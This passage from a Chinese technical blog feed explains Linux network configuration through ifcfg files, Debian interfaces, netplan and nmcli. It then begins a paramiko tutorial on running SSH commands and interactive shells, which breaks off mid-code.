title="配置参数说明"></a>配置参数说明</h2><table><thead><tr><th>参数名</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>HWADDR</td><td></td><td>网卡的MAC地址</td></tr><tr><td>TYPE</td><td>Ethernet</td><td>一般为Ethernet以太网</td></tr><tr><td>DEVICE</td><td>eth0</td><td>设备名</td></tr><tr><td>NAME</td><td>eth0</td><td>连接名</td></tr><tr><td>NM_CONTROLLED</td><td>no</td><td>是否可以由NetworkManager托管</td></tr><tr><td>ONBOOT</td><td>yes</td><td>开机自动启用该连接</td></tr><tr><td>BOOTPROTO</td><td>none&#x2F;dhcp&#x2F;static</td><td>设置为none禁止DHCP，设置为static启用静态IP地址，设置为dhcp开启DHCP服务</td></tr><tr><td>PEERDNS</td><td>yes</td><td>设置PEERDNS&#x3D;yes（这也是系统的默认配置）则启用该网络设备时，会修改或生成resolv.conf文件，设置PEERDNS&#x3D;no，则不对resolv.conf做任何变动。</td></tr><tr><td>PEERROUTES</td><td>yes</td><td>设置PEERROUTES&#x3D;yes（这也是系统的默认配置）则启用该网络设备时，会修改系统路由表，设置PEERDNS&#x3D;no，则不对系统路由表做任何变动。</td></tr><tr><td>UUID</td><td></td><td>系统全局唯一标识符，可以通过uuidgen eth0生成</td></tr><tr><td>SLAVE</td><td></td><td>指定了该接口是一个接合界面的组件</td></tr><tr><td>MASTER</td><td>bond0</td><td>指定bond模式下的master</td></tr><tr><td>BRIDGE</td><td>br0</td><td>设置桥接网卡</td></tr><tr><td>USERCTL</td><td>no</td><td>是否允许非root用户控制该设备，默认设置为no，只能用root用户更改</td></tr><tr><td>DEFROUTE</td><td>yes</td><td>默认路由(yes&#x2F;no)，一般为yes</td></tr><tr><td>PREFIX</td><td>24</td><td>子网掩码24位</td></tr><tr><td>IPADDR</td><td></td><td>IP地址</td></tr><tr><td>NETMASK</td><td></td><td>子网掩码</td></tr><tr><td>DNS1</td><td></td><td>主DNS服务器</td></tr><tr><td>DNS2</td><td></td><td>备用DNS服务器</td></tr><tr><td>IPV4_FAILURE_FATAL</td><td>no</td><td>如果ipv4配置失败禁用设备</td></tr><tr><td>IPV6INIT</td><td>yes</td><td>是否启用IPv6的接口</td></tr><tr><td>IPV6_AUTOCONF</td><td>yes</td><td></td></tr><tr><td>IPV6_DEFROUTE</td><td>yes</td><td></td></tr><tr><td>IPV6_PEERDNS</td><td>yes</td><td></td></tr><tr><td>IPV6_PEERROUTES</td><td>yes</td><td></td></tr><tr><td>IPV6_FAILURE_FATAL</td><td>no</td><td>如果ipv6配置失败禁用设备</td></tr></tbody></table><h2 id="配置生效"><a href="#配置生效" class="headerlink" title="配置生效"></a>配置生效</h2><p>配置完成后需要重启network服务：<code>systemctl restart network</code>或<code>service network restart</code></p><h1 id="network-service-Debian"><a href="#network-service-Debian" class="headerlink" title="network.service(Debian)"></a>network.service(Debian)</h1><p>使用<code>ifconfig</code>及其配置文件<code>/etc/network/interfaces</code>来配置网络</p><h2 id="配置文件及参数说明"><a href="#配置文件及参数说明" class="headerlink" title="配置文件及参数说明"></a>配置文件及参数说明</h2><p><code>/etc/network/interfaces</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo # 网卡自启动</span><br><span class="line">iface lo inet loopback # 配置lo的类型为loopback</span><br><span class="line"></span><br><span class="line">auto ens33 # 网卡自启动</span><br><span class="line">allow-hotplug ens33</span><br><span class="line">iface ens33 inet static # 配置ens33的类型为静态IP</span><br><span class="line">address 192.168.2.22 # IP地址</span><br><span class="line">netmask 255.255.255.0 # 掩码</span><br><span class="line">gateway 192.168.2.2 # 网关</span><br><span class="line">network 192.168.2.0 # 可选，所在网络号，默认自动配置</span><br><span class="line">broadcast 192.168.2.255 # 可选，广播地址，默认自动配置</span><br><span class="line">dns-nameservers 8.8.8.8 192.168.2.1 # dns服务器</span><br></pre></td></tr></table></figure><p>注释可能导致配置异常，实际使用中建议清除注释。</p><h2 id="配置生效-1"><a href="#配置生效-1" class="headerlink" title="配置生效"></a>配置生效</h2><p><code>systemctl restart networking</code></p><h1 id="netplan-Ubuntu"><a href="#netplan-Ubuntu" class="headerlink" title="netplan(Ubuntu)"></a>netplan(Ubuntu)</h1><blockquote><p>原文引用自<a href="https://www.myfreax.com/how-to-configure-static-ip-address-on-ubuntu-20-04/">如何在Ubuntu 20.04上配置静态IP地址</a></p></blockquote><p>Ubuntu 17.10及以后版本使用<code>netplan</code>作为默认网络配置工具，更早版本同Debian。Netplan配置文件使用YAML语法编写，文件扩展名为.yaml。Netplan支持两个渲染器：NetworkManager和Systemd-networked。NetworkManager主要在台式机上使用，而Systemd-networked在没有GUI的服务器上使用。</p><h2 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h2><p>Netplan配置文件存储在<code>/etc/netplan</code>目录中<br>示例<code>/etc/netplan/01-netcfg.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">ens3:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">192.168</span><span class="number">.121</span><span class="number">.221</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">to:</span> <span class="string">default</span></span><br><span class="line">          <span class="attr">via:</span> <span class="number">192.168</span><span class="number">.121</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span>, <span class="number">119.29</span><span class="number">.29</span><span class="number">.29</span>]</span><br><span class="line">  <span class="attr">wifis:</span></span><br><span class="line">    <span class="attr">wlan0:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">access-points:</span></span><br><span class="line">        <span class="attr">&quot;wifi-ssid&quot;:</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure><h2 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h2><p>每个Netplan Yaml文件都以<code>network</code>键开头，该键至少包含两个必需元素。第一个必需元素是网络配置格式的版本<code>version</code>，第二个是设备类型。 设备类型可以是<code>ethernets</code>，<code>bonds</code>，<code>bridges</code>, <code>vlans</code>, <code>wifis</code>。</p><p>上面的配置还有一行<code>renderer</code>类型的行。 如果您以服务器模式安装Ubuntu，则开箱即用，<code>networkd</code>作为renderer渲染器的后端；桌面模式安装则<code>NetworkManager</code>作为renderer渲染器的后端。</p><p>在设备类型<code>ethernets</code>下，可以指定一个或多个网络接口。</p><p>编辑Yaml文件时，请确保遵循YAML代码缩进标准。 如果语法不正确，则更改将不会应用。</p><h2 id="配置生效-2"><a href="#配置生效-2" class="headerlink" title="配置生效"></a>配置生效</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netplan generate <span class="comment"># 配置检查</span></span><br><span class="line">netplan apply <span class="comment"># 配置生效</span></span><br></pre></td></tr></table></figure><h1 id="NetworkManager"><a href="#NetworkManager" class="headerlink" title="NetworkManager"></a>NetworkManager</h1><blockquote><p>原文引用自<a href="https://zhuanlan.zhihu.com/p/52731316">NetworkManager设置</a></p></blockquote><p>通常的linux发行版对于网络的配置方法一般会同时支持network.service（即配置和使用<code>/etc/sysconfig/network-scripts/</code>下的配置文件来配置网络，对于debian是<code>/etc/network/interfaces</code>等）和NetworkManager.service（简称NM）。默认情况下，这2个服务都开启，而且功能上是平行的，可以通过任意一个来配置网络，正常的情况下通过NM来配置网络后它会自动把配置同步到network.service的配置中。</p><p>在NM里，有2个层级：<strong>连接（connection）和设备（device）</strong>，连接的配置记录在<code>/etc/NetworkManager/system-connections/</code>内（对于ubuntu），<strong>通常NM的管理是以连接为单位的，在连接的配置文件里指明设备名</strong>，所以我们在NM的所有配置目录里找不到针对设备的配置文件，只有针对连接的配置文件，就像你的手机wifi可以记住多个无线连接一样，<strong>多个连接可以使用同一个设备，但同一时刻，一个设备只能有一个连接活跃</strong>。意思就是你的手机wifi在一个时刻只能连接一个wifi。可以通过 nmcli connetion up&lt;连接&gt; 来切换连接。</p><p>对于一个device有4种常见状态，使用<code>nmcli device</code>查看：</p><ul><li>connected：已被NM托管，并且当前有活跃的connection</li><li>disconnected：已被NM托管，但是当前没有活跃的connection</li><li>unmanaged：未被NM托管，就是不让NM动这个设备相关的任何操作</li><li>unavailable：不可用，NM无法托管，通常出现于网卡link为down的时候（比如ip link set ethX down）</li></ul><p>对于任意设备上的任一connection通常有2种状态，使用<code>nmcli connection</code>查看：</p><ul><li>活跃（带颜色字体）：表示当前该connection是正在使用的</li><li>非活跃（正常字体）：表示当前该connection没有连接</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ul><li>nmcli：命令行。这是最常用的工具，支持tab补全</li><li>nmtui：在shell终端开启文本图形界面</li><li>Freedesktop applet：如GNOME上自带的网络管理工具</li><li>nm-connection-editor图形配置工具</li><li>cockpit：redhat自带的基于web图形界面的”驾驶舱”工具，具有dashborad和基础管理功能</li></ul><h2 id="nmcli常用命令一览"><a href="#nmcli常用命令一览" class="headerlink" title="nmcli常用命令一览"></a>nmcli常用命令一览</h2><h3 id="对于connection"><a href="#对于connection" class="headerlink" title="对于connection"></a>对于connection</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看ip（类似于ifconfig、ip addr）</span></span><br><span class="line">nmcli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建connection，配置静态ip（等同于配置ifcfg，其中BOOTPROTO=none，并ifup启动）</span></span><br><span class="line">nmcli c add <span class="built_in">type</span> ethernet con-name CNNCT1 ifname ethX ipv4.addr 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.method manual</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建connection，配置动态ip（等同于配置ifcfg，其中BOOTPROTO=dhcp，并ifup启动）</span></span><br><span class="line">nmcli c add <span class="built_in">type</span> ethernet con-name CNNCT1 ifname ethX ipv4.method auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改ip（非交互式）</span></span><br><span class="line">nmcli c modify CNNCT1 ipv4.addr <span class="string">&#x27;192.168.1.200/24&#x27;</span></span><br><span class="line">nmcli c up CNNCT1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改ip（交互式）</span></span><br><span class="line">nmcli c edit CNNCT1</span><br><span class="line">nmcli&gt; goto ipv4.addresses</span><br><span class="line">nmcli ipv4.addresses&gt; change</span><br><span class="line">Edit <span class="string">&#x27;addresses&#x27;</span> value: 192.168.1.200/24</span><br><span class="line">Do you also want to <span class="built_in">set</span> <span class="string">&#x27;ipv4.method&#x27;</span> to <span class="string">&#x27;manual&#x27;</span>? [<span class="built_in">yes</span>]: <span class="built_in">yes</span></span><br><span class="line">nmcli ipv4&gt; save</span><br><span class="line">nmcli ipv4&gt; activate</span><br><span class="line">nmcli ipv4&gt; quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用connection（相当于ifup）</span></span><br><span class="line">nmcli c up CNNCT1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止connection（相当于ifdown）</span></span><br><span class="line">nmcli c down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除connection（类似于ifdown并删除ifcfg）</span></span><br><span class="line">nmcli c delete CNNCT1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看connection列表</span></span><br><span class="line">nmcli c show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看connection详细信息</span></span><br><span class="line">nmcli c show CNNCT1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重载所有ifcfg或route到connection（不会立即生效）</span></span><br><span class="line">nmcli c reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重载指定ifcfg或route到connection（即导入原来的系统配置，不会立即生效）</span></span><br><span class="line">nmcli c load /etc/sysconfig/network-scripts/ifcfg-eth0 //注意eth0是设备名(centos)</span><br><span class="line">nmcli c load /etc/sysconfig/network-scripts/route-eth0 //这个是配置的路由(centos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 立即生效connection，有3种方法</span></span><br><span class="line">nmcli c up CNNCT1</span><br><span class="line">nmcli d reapply CNNCT1</span><br><span class="line">nmcli d connect CNNCT1</span><br></pre></td></tr></table></figure><h3 id="对于device"><a href="#对于device" class="headerlink" title="对于device"></a>对于device</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看device列表</span></span><br><span class="line">nmcli d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有device详细信息</span></span><br><span class="line">nmcli d show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看指定device的详细信息</span></span><br><span class="line">nmcli d show eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活网卡</span></span><br><span class="line">nmcli d connect eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭无线网络（NM默认启用无线网络）</span></span><br><span class="line">nmcli r all off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看NM托管状态</span></span><br><span class="line">nmcli n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启NM托管</span></span><br><span class="line">nmcli n on</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭NM托管（谨慎执行）</span></span><br><span class="line">nmcli n off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听事件</span></span><br><span class="line">nmcli m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看NM本身状态</span></span><br><span class="line">nmcli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测NM是否在线可用</span></span><br><span class="line">nm-online</span><br></pre></td></tr></table></figure><h3 id="nmcli-device重点"><a href="#nmcli-device重点" class="headerlink" title="nmcli device重点"></a>nmcli device重点</h3><p><code>nmcli d connect eth0</code>：由NM对指定网卡进行管理，同时刷新该网卡对应的活跃connection（如果之前有修改过connection配置）；如果有connection但是都处于非活跃状态，则自动选择一个connection并将其活跃；如果没有connection，则自动生成一个并将其活跃。</p><p><code>nmcli d disconnect eth0</code>：让NM断开指定网卡的连接，此操作不会变更实际网卡的link状态，只会使对应的connection变成非活跃。若重启系统则又会自动connect。另外，如果手工将该网卡的connection全部删掉，该网卡状态也会自动变为disconnected。</p><p><code>nmcli d reapply eth0</code>：专门用于刷新connection，前提是网卡的device处于connected状态，否则会报错。</p><p><code>nmcli d set eth0 autoconnect yes|no managed yes|no</code>：可以设置是否自动连接和是否自动管理，但经测试只能用于当前开机状态， 如果这2个参数都设置为no，然后重启系统，又会自动恢复成connected和managed yes的状态。所以该命令用途不大。注意事项：如果managed设置为no，那么<code>nmcli c reload</code>会读取配置文件，但是不会立即生效，接着如果执行<code>nmcli c up CNNT1</code>，就会立即生效，同时managed自动变为yes。</p><h2 id="NM注意点"><a href="#NM注意点" class="headerlink" title="NM注意点"></a>NM注意点</h2><ol><li>nmcli命令支持tab补全，但是需要<code>yum install bash-completion</code></li><li>如果希望NM不要纳管网卡，只有一个办法最彻底最靠谱，就是自己写ifcfg，内容加上<code>NM_CONTROLLED=no</code>，这样该device的状态就会始终保持unmanaged。<code>nmcli c up、nmcli c reload、nmcil c load</code>都不会对其起任何作用。</li><li>NM只能对link状态为up的网卡进行操作，如果手动<code>ip link set ethX down</code>，那么NM就无法对该网卡做任何操作（即使<code>nmcli d connect</code>也没有用）。</li><li>可以通过<code>yum install network-scripts</code>来安装传统的network.service，不过redhat说了，在下一个rhel的大版本里将彻底废除，因此不建议使用network.service。</li><li>手工创建新的ifcfg或者在ifcfg里修改ip等配置，NM不会自动读取，需要手工执行 <code>nmcli c reload</code>或者<code>nmcli c load/etc/sysconfig/network-scripts/ifcfg-ethX</code>。这一点可能和其他系统的NM行为不太一样，但这种做法实则更适合服务器。</li><li>不手工配置ifcfg，使用默认的dhcp情况下，网卡的增减是不会自动生成ifcfg，此时<code>nmcli c</code>看到的con-name将类似’System ethX’或者’Wired connection 1’。</li><li>NetworkManager支持3种获取dhcp的方式：dhclient、dhcpcd、internal，当<code>/etc/NetworkManager/NetworkManager.conf</code>配置文件中的[main]部分没配置 <code>dhcp=</code>时候，默认使用internal（rhel7&#x2F;centos7默认是dhclient）。internal是NM内部实现的dhcp客户端。</li><li>关于手动指定网关ip的方法，经过实测，<code>/etc/sysconfig/network-scrpts/</code>中的GATEWAY仅在3种情况下有效： <code>NM_CONTROLLED=no</code>或<code>ipv4.method manual</code>或从<code>ipv4.method manual</code>第一次转到<code>ipv4.methodauto</code>时候。建议：当<code>NM_CONTROLLED=no</code>时，将网关写在<code>/etc/sysconfig/network</code>（GATEWAY）；当使用NM时候，使用<code>nmcli c</code>命令配置网关（比如 <code>nmcli c modify ethX ipv4.gateway 192.168.1.1</code>）。</li><li>NM默认会从dhcp里获取dns信息，并修改<code>/etc/resolv.conf</code>，如果不想让NM管理<code>/etc/resolv.conf</code>，则只需在<code>/etc/NetworkManager/NetworkManager.conf</code>里的[main]里增加<code>dns=none</code>即可。</li><li>如果想让NM不要自动管理新网卡（比如不要给新网卡获取ip地址），则只需在<code>/etc/NetworkManager/NetworkManager.conf</code>里的[main]里增加<code>no-auto-default=*</code>即可，改完后通过<code>systemctl restart NetworkManager</code>或者重启系统来生效。</li><li>除了手工在NetworkManager.conf里加配置，也可以<code>yum install NetworkManager-config-server</code>，这会生成<code>/usr/lib/NetworkManager/conf.d/00-server.conf</code>。建议使用前者方案，因为后者的<code>ingore-carrier</code>是不被推荐的参数。</li><li>更多NetworkManager参数详见<code>man NetworkManager.conf</code>。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> IP配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用paramiko进行自动化ssh/sftp</title>
      <link href="/2022/01/14/Tools/paramiko/"/>
      <url>/2022/01/14/Tools/paramiko/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paramiko</span><br></pre></td></tr></table></figure><h1 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h1><h2 id="SSHClient"><a href="#SSHClient" class="headerlink" title="SSHClient"></a>SSHClient</h2><p><code>SSHClient</code>是<code>paramiko</code>提供的一个高级接口，用于管理SSH连接的建立、认证、断开等操作。它封装了底层的SSH协议细节，提供了用户友好的方法来执行常见的SSH任务，比如登录远程服务器、执行命令、获取命令结果等。使用<code>SSHClient</code>可以非常方便地建立一个SSH会话，并执行需要的操作。</p><h2 id="SFTPClient"><a href="#SFTPClient" class="headerlink" title="SFTPClient"></a>SFTPClient</h2><p><code>SFTPClient</code>是用于进行SFTP协议操作的类。与SCP协议相比，SFTP提供了更丰富的文件操作功能，比如列出目录内容、读写文件、修改文件属性等。<code>SFTPClient</code>依赖于一个已经建立的SSH会话。通常，你会先使用<code>SSHClient</code>或者<code>Transport</code>建立连接，然后在这个连接基础上创建<code>SFTPClient</code>来进行文件传输。</p><h2 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h2><p><code>Transport</code>是<code>paramiko</code>中较为底层的一个类，用于直接管理SSH协议的传输层。它处理诸如加密、压缩、认证等底层细节。Transport&#96;可以被看作是一个通道（Channel）的容器，它可以创建并管理多个通道。每个通道可以被用于不同的目的，比如一个用于命令执行，另一个用于文件传输等。</p><p><a href="https://docs.paramiko.org/en/latest/api/transport.html">paramiko.org</a>对<code>transport</code>的解释：SSH传输附加到流（通常是socket），协商加密会话，进行身份验证，然后跨会话创建流通道（称为channels）。多个通道可以在单个会话中多路复用（在端口转发的情况下通常是这样）。</p><h2 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h2><p><code>Channel</code>是<code>paramiko</code>中用于表示一个单独的逻辑连接通道的类。在一个SSH连接中，可以同时存在多个通道，每个通道可以用来执行不同的任务（如一个用于Shell命令执行，另一个用于文件传输）。<code>Channel</code>类似于网络编程中的<code>socket</code>，是数据通信的基本单元。</p><h2 id="相互关系"><a href="#相互关系" class="headerlink" title="相互关系"></a>相互关系</h2><ul><li><code>SSHClient</code>&#x2F;<code>SFTPClient</code>和<code>Transport</code>：<code>SSHClient</code>&#x2F;<code>SFTPClient</code>内部使用<code>Transport</code>来处理所有的底层细节。当你使用<code>SSHClient</code>&#x2F;<code>SFTPClient</code>连接到一个SSH服务器时，它实际上是在创建一个<code>Transport</code>实例，并通过这个实例来建立和管理连接。</li><li><code>Transport</code>和<code>Channel</code>：<code>Transport</code>负责创建和管理多个<code>Channel</code>。每个<code>Channel</code>可以独立用于不同的任务（例如，一个执行命令，另一个传输文件）。</li></ul><h1 id="SSHClient-1"><a href="#SSHClient-1" class="headerlink" title="SSHClient"></a>SSHClient</h1><h2 id="使用exec-command执行简单命令"><a href="#使用exec-command执行简单命令" class="headerlink" title="使用exec_command执行简单命令"></a>使用exec_command执行简单命令</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) <span class="comment">#自动接受并将hostkey加入known_hosts列表</span></span><br><span class="line">ssh.connect(hostname=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">22</span>, username=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ssh_stdout.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">ssh.close() <span class="comment">#关闭连接</span></span><br></pre></td></tr></table></figure><p>使用这种方式，代码简单，但是只能用于简单的不需要I&#x2F;O交互的命令。</p><h2 id="使用invoke-shell模拟终端执行复杂命令"><a href="#使用invoke-shell模拟终端执行复杂命令" class="headerlink" title="使用invoke_shell模拟终端执行复杂命令"></a>使用invoke_shell模拟终端执行复杂命令</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) <span class="comment">#自动接受并将hostkey加入known_hosts列表</span></span><br><span class="line">ssh.connect(hostname=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">22</span>, username=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chan = ssh.invoke_shell() <span class="comment">#获取伪terminal</span></span><br><span class="line">chan.settimeout(<span class="number">60</span>) <span class="comment">#设置终端响应超时时间</span></span><br><span class="line"></span><br><span class="line">chan.send(<span class="string">b&quot;vim test3.txt\n&quot;</span>) <span class="comment">#进行vim交互操作</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    result += chan.recv(<span class="number">32768</span>) <span class="comment">#接收终端数据</span></span><br><span class="line"><span class="built_in">print</span>(result.decode())</span><br><span class="line"></span><br><span class="line">chan.send(<span class="string">b&quot;i&quot;</span>) <span class="comment">#vim进入i模式</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    ret = chan.recv(<span class="number">32768</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(ret.decode())</span><br><span class="line">chan.send(<span class="string">b&quot;qwe&quot;</span>) <span class="comment">#交互写入qwe</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    result += chan.recv(<span class="number">32768</span>) <span class="comment">#接收终端数据</span></span><br><span class="line"><span class="built_in">print</span>(result.decode())</span><br><span class="line"></span><br><span class="line">chan.send(<span class="string">b&quot;\x1b&quot;</span>) <span class="comment">#发送ESC键，每一个按键或组合键都对应了一个ASCII码，自行查询ASCII码表</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    result += chan.recv(<span class="number">32768</span>) <span class="comment">#接收终端数据</span></span><br><span class="line"><span class="built_in">print</span>(result.decode())</span><br><span class="line"></span><br><span class="line">chan.send(<span class="string">b&quot;:wq!\n&quot;</span>) <span class="comment">#输入:wq!</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    result += chan.recv(<span class="number">32768</span>) <span class="comment">#接收终端数据</span></span><br><span class="line"><span class="built_in">print</span>(result.decode()) <span class="comment">#至此vim交互写入完成</span></span><br><span class="line"></span><br><span class="line">chan.send(<span class="string">b&quot;cat test3.txt\n&quot;</span>) <span class="comment">#查看写入是否成功</span></span><br><span class="line">result = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> chan.recv_ready():</span><br><span class="line">    result += chan.recv(<span class="number">32768</span>) <span class="comment">#接收终端数据，类似于socket套接字操作</span></span><br><span class="line"><span class="built_in">print</span>(result.decode())</span><br><span class="line"></span><br><span class="line">ssh.close() <span 